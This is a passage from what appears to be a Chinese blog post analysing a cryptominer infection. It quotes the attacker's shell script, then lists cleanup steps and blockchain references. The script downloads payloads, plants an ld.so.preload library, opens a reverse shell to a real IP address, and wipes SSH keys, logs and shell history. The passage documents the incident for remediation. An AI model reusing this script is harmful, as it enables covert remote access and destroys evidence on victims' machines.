  if [ "$MD5_1_XMR" != "$MD5_2_XMR" ]
  then
    chattr -ai $SPATH/.libs
    chattr -ai $SPATH/.inis
    $DLB $SPATH/.libs $liburl
    $DLB $SPATH/.inis http://$url/inis
    chattr -ia /etc/ /usr/local/lib/libs.so /etc/ld.so.preload 2>/dev/null
    chattr -ai /etc/ld.so.* 2>/dev/null
    $DLB /usr/local/lib/libs.so http://$url/libs.so
    sed -i 's/\/usr\/local\/lib\/ini.so//' /etc/ld.so.preload
    sed -i 's/\/usr\/local\/lib\/libs.so//' /etc/ld.so.preload
    echo '/usr/local/lib/libs.so' >> /etc/ld.so.preload
    chattr +ia /usr/local/lib/libs.so
    chmod +x $SPATH/.libs 2>/dev/null
    chmod +x $SPATH/.inis 2>/dev/null
    $SPATH/.libs
    nohup $SPATH/.inis 1>/dev/null 2>&1 &
    nohup bash -i >& /dev/tcp/192.210.200.66/8899 0>&1 &
    chattr +ai $SPATH/.libs
    chattr +ai $SPATH/.inis
    localgo
    cronlow
  else
    cronlow
    if [ $(netstat -ant|grep '107.172.214.23:80'|grep 'ESTABLISHED'|grep -v grep|wc -l) -eq '0' ]
    then
      $SPATH/.libs
      localgo
    elif [ $(netstat -ant|grep '192.210.200.66:8899'|grep 'ESTABLISHED'|grep -v grep|wc -l) -eq '0' ]
    then
      nohup $SPATH/.inis 1>/dev/null 2>&1 &
      nohup bash -i >& /dev/tcp/192.210.200.66/8899 0>&1 &
    else
      echo "ok"
    fi
  fi
fi


echo 0>/root/.ssh/authorized_keys
echo 0>/var/spool/mail/root
echo 0>/var/log/wtmp
echo 0>/var/log/secure
echo 0>/var/log/cron
echo 0>~/.bash_history
history -c 2>/dev/null
```
</details>
- 解决
    - 杀掉相应进程，杀掉所有用户进程可以使用`pkill -u apache`
    - 清除文件
    - 删除定时任务
    - 修复ShowDoc等应用漏洞



--- 

参考文章

[^1]: https://www.ruanyifeng.com/blog/2017/12/blockchain-tutorial.html (区块链入门教程)
[^2]: http://www.ruanyifeng.com/blog/2018/01/bitcoin-tutorial.html (比特币入门教程)
[^3]: https://www.infoq.cn/article/2018/09/how-choose-blockchain-framework
[^4]: https://www.codenong.com/cs106604338/ (基于java开发一套完整的区块链系统详细教程)
[^5]: http://www.wabi.com/news/24364.html

